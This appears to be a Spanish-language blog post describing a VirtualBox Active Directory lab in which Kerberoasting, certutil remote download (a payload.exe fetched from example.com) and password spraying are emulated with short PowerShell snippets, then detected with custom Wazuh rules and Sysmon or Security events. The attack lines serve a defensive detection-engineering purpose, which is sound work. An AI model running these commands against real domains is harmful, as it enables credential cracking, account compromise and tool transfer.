---
title: "Lab de Detección en Active Directory"
date: 2026-10-06
published: true
---

Con este laboratorio basico de Active Directory se intenta recrear ciberataques comunes y detectarlos con el agente de Wazuh. 

## 1. Arquitectura y Entorno de Pruebas

El entorno opera sobre una red aislada en VirtualBox (`192.168.56.0/24`):

* **DC01 (`192.168.56.10`):** Windows Server 2022 (Domain Controller `deviltrigger.local`, 2 GB RAM).
* **CLIENTE01 (`192.168.56.20`):** Windows 11 Enterprise unido al dominio con Sysmon y agente Wazuh (2.5 GB RAM).
* **Wazuh Server (`192.168.56.8`):** Ubuntu Server 24.04 con Wazuh 4.9 (4.5 GB RAM, OpenSearch Heap limitado a 2 GB).

---

## 2. Caso 1: Kerberoasting (MITRE ATT&CK T1558.003)

### Concepto y Vector de Ataque
Kerberoasting explota el diseño del protocolo Kerberos: cualquier usuario autenticado en el dominio puede solicitar un ticket de servicio (TGS) para cualquier cuenta que tenga registrado un Service Principal Name (SPN). La porción del ticket cifrada con el hash NTLM de la cuenta de servicio puede extraerse de memoria y crackearse offline.

Para maximizar la probabilidad de éxito en el crackeo, los atacantes suelen forzar una degradación del cifrado solicitando tickets en **RC4-HMAC (`0x17`)** en lugar de AES-256.

### Emulación Ofensiva
Desde **CLIENTE01**, bajo la sesión del usuario del dominio, se purgó la caché Kerberos y se solicitó un ticket para la cuenta de servicio `svc_sql` mediante la clase de .NET `KerberosRequestorSecurityToken`:

```powershell
klist purge
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dc01.deviltrigger.local:1433"
klist
```

<img alt="01_kerberoast_powershell_klist" src="https://github.com/user-attachments/assets/7ddc5296-1366-4341-86b4-8f56c9b15c7f" />

Al inspeccionar los vales en memoria con `klist`, se verifica que el ticket devuelto utiliza cifrado débil `RSADSI RC4-HMAC(NT)`:

### Telemetría Forense (Event ID 4769)

La solicitud TGS impacta directamente en el Domain Controller (**DC01**), registrándose en el canal `Security` bajo el **Event ID 4769** (_A Kerberos service ticket was requested_).

Al examinar el log crudo en Wazuh Discover se extraen los campos clave para discriminar actividad maliciosa:

- `win.system.eventID`: `4769`
- `win.eventdata.serviceName`: `svc_sql` (cuenta de servicio de usuario, no cuenta de máquina terminada en `$`).
- `win.eventdata.ticketEncryptionType`: `0x17` (indicador directo de cifrado RC4).
- `win.eventdata.ipAddress`: `::ffff:192.168.56.20` (IP de origen del cliente).

<img alt="02_wazuh_raw_event_4769" src="https://github.com/user-attachments/assets/e7c66f0c-f2fb-4714-af12-0baf3b77ebe1" />

### Implementación de la Detección en Wazuh

En `/var/ossec/etc/rules/local_rules.xml` se implementó la regla `100100` con severidad 10:

```xml
<group name="windows, active_directory, kerberos,">
  <rule id="100100" level="10">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.ticketEncryptionType">^0x17$</field>
    <description>Posible Kerberoasting: Solicitud TGS con cifrado debil (RC4) para $(win.eventdata.serviceName) desde $(win.eventdata.ipAddress)</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
  </rule>
</group>
```

### Verificación en Threat Hunting

Tras compilar con `wazuh-analysisd -t` y reiniciar el manager, la reejecución del ataque activó la alerta en el SIEM, mostrando la correlación con la técnica T1558.003 sobre el agente `DC01`:

<img alt="04_threat_hunting_alert_mitre1" src="https://github.com/user-attachments/assets/505191eb-0ffd-49f1-b8b2-2d695d455888" />

<img alt="04_threat_hunting_alert_mitre2" src="https://github.com/user-attachments/assets/20b5b9b0-80d1-47c8-9a6b-5432aeb5b2d4" />

## 3. Caso 2: LOLBins - Ingress Tool Transfer con Certutil (MITRE ATT&CK T1105 / T1218)

### Concepto y Vector de Ataque

Los Living-off-the-Land Binaries (LOLBins) son ejecutables legítimos y firmados por Microsoft que los atacantes reutilizan para tareas maliciosas evadiendo listas blancas de ejecución. `certutil.exe`, diseñado originalmente para gestionar certificados y revocaciones, cuenta con parámetros que permiten descargar archivos arbitrarios desde URLs externas.

### Emulación Ofensiva

En **CLIENTE01**, tras aislar las firmas de Windows Defender para permitir la recolección de telemetría de comportamiento, se ejecutó la descarga remota simulada:

```powershell
certutil.exe -urlcache -split -f http://example.com/favicon.ico C:\Users\Public\payload.exe
```

Aunque la URL devuelva un código HTTP 404, el proceso y la intención adversaria quedan materializados en el sistema operativo.

### Telemetría de Proceso en Sysmon (Event ID 1)

Sysmon registra la creación del proceso bajo el canal operacional con el **Event ID 1** (_Process Create_), proporcionando campos contextuales deterministas:

- `data.win.eventdata.image`: `C:\Windows\System32\certutil.exe`
- `data.win.eventdata.commandLine`: Parámetros completos (`-urlcache -split -f http://...`)
- `data.win.eventdata.parentCommandLine`: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- `data.win.eventdata.hashes`: Hashes SHA256/MD5 del binario para validación de integridad.

<img alt="lolbins ataque" src="https://github.com/user-attachments/assets/eb08aaae-6fce-487a-95d6-32ad5dcb75dd" />

<img alt="lolbins ataque 2" src="https://github.com/user-attachments/assets/b9036c56-df41-4816-96ae-d1c486751444" />

### Implementación de la Detección en Wazuh

Se creó la regla `100101` (Nivel 12) inspeccionando los argumentos del proceso dentro del grupo base de eventos de Windows:

```xml
<group name="windows,sysmon,lolbins,">
  <rule id="100101" level="12">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^1$</field>
    <field name="win.eventdata.commandLine">urlcache</field>
    <description>Uso sospechoso de LOLBin Certutil para descarga remota por $(win.eventdata.user)</description>
    <mitre>
      <id>T1105</id>
      <id>T1218</id>
    </mitre>
  </rule>
</group>
```

### Verificación en Threat Hunting

La ejecución disparó la alerta correlacionada en tiempo real bajo el agente `CLIENTE01`, asociando las técnicas T1105 (Ingress Tool Transfer) y T1218 (System Binary Proxy Execution):

<img alt="threat hunting lolbins" src="https://github.com/user-attachments/assets/65aab21f-3fee-40b5-b9c7-9e69756a4b88" />

## 4. Caso 3: Password Spraying (MITRE ATT&CK T1110.003)

### Concepto y Vector de Ataque

A diferencia de los ataques de fuerza bruta vertical (múltiples contraseñas contra un único usuario, lo que dispara los bloqueos de cuenta por directiva), el **Password Spraying** es un barrido horizontal: el atacante prueba **una única contraseña común** contra un catálogo amplio de usuarios válidos del dominio.

El desafío defensivo radica en que un evento individual de fallo de inicio de sesión es indistinguible de un error humano legítimo. La detección exige **correlación por agregación y umbral temporal**.

### Emulación Ofensiva

En **CLIENTE01** se ejecutó un script en PowerShell que consulta al controlador de dominio mediante `System.DirectoryServices.AccountManagement`, probando una contraseña incorrecta contra múltiples usuarios (`j.serrano`, `r.ruiz`, `j.medina`, `i.shuang`, `d.galaz`):

```powershell
$usuarios = @("j.serrano", "r.ruiz", "j.medina", "i.shuang", "d.galaz")
$passFalsa = "locurotedecontraseña!"
$dominio = "deviltrigger.local"

Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$contexto = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $dominio)

foreach ($u in $usuarios) {
    Write-Host "[>] Probando credenciales contra '$u'..." -NoNewline
    $valido = $contexto.ValidateCredentials($u, $passFalsa)
    Write-Host " [FALLO - Esperado]" -ForegroundColor Red
    Start-Sleep -Milliseconds 400
}
```


<img alt="fuerzabrutaps1" src="https://github.com/user-attachments/assets/9b1c1445-83e5-44bf-b025-769925b65578" />

### Telemetría Forense en DC01 (Event ID 4625)

Cada intento genera en **DC01** un evento de fallo de logon:

- `win.system.eventID`: `4625` (_An account failed to log on_)
- `win.eventdata.subStatus`: `0xc000006a` (_Bad user name or password_)
- `win.eventdata.ipAddress`: `192.168.56.20` (IP de CLIENTE01)
- `win.eventdata.targetUserName`: Distintos identificadores para cada intento.

<img alt="logcrudo fuerza bruta" src="https://github.com/user-attachments/assets/0cd21e5c-94aa-48a3-8f8e-e98925501b41" />

### Detección Agregada en Wazuh

Dado que la regla base de fallo de inicio de sesión de Windows (`60122`) opera a nivel 0 (sin alertar por eventos aislados), se diseñó la regla hija `100102` con agregación por umbral (`frequency="4"` en `timeframe="180"` segundos) vinculando el origen mediante `same_field`:

```xml
<group name="windows,active_directory,credential_access,">
  <rule id="100102" level="11" frequency="4" timeframe="180">
    <if_matched_sid>60122</if_matched_sid>
    <same_field>win.eventdata.ipAddress</same_field>
    <description>Posible Password Spraying: Multiples fallos de autenticacion en ventana temporal desde $(win.eventdata.ipAddress)</description>
    <mitre>
      <id>T1110.003</id>
      <id>T1110</id>
    </mitre>
  </rule>
</group>
```

### Verificación en Threat Hunting

La ráfaga de intentos fallidos activó la regla de correlación agregada en Wazuh Dashboard, generando una alerta de Nivel 11 mapeada a **T1110.003**:

<img alt="threat hunting pass" src="https://github.com/user-attachments/assets/139a3b1c-0026-4da1-9065-903eebcb5097" />

## Threat Hunting de todos los ataques

<img alt="todos los ataques en threat hunting" src="https://github.com/user-attachments/assets/ba86846b-9e34-4e1b-aec1-acabd9eb65ea" />

## 5. Resumen de Detecciones y Próximos Pasos

Con la finalización de esta fase, el laboratorio cuenta con una línea base activa de detección para vectores de credenciales y ejecución de binarios:

|**Técnica MITRE**|**Vector**|**Fuente de Telemetría**|**Regla SIEM**|**Nivel**|
|---|---|---|---|---|
|**T1558.003**|Kerberoasting (RC4 Degradation)|DC01 (Security 4769)|`100100`|10|
|**T1105 / T1218**|Abuso de LOLBin (`certutil -urlcache`)|CLIENTE01 (Sysmon 1)|`100101`|12|
|**T1110.003**|Password Spraying (Agregación temporal)|DC01 (Security 4625)|`100102`|11|

El siguiente bloque del laboratorio abordará la fase de **Post-Explotación**, cubriendo movimiento lateral mediante **PsExec y WMI**, y técnicas avanzadas de volcado de memoria sobre el proceso `lsass.exe` (**Mimikatz / Sysmon Event ID 10**).

Nos vemos en la próxima publicación!

![ken](https://github.com/user-attachments/assets/dc12abde-26e1-4955-be48-9a267b3102c6)
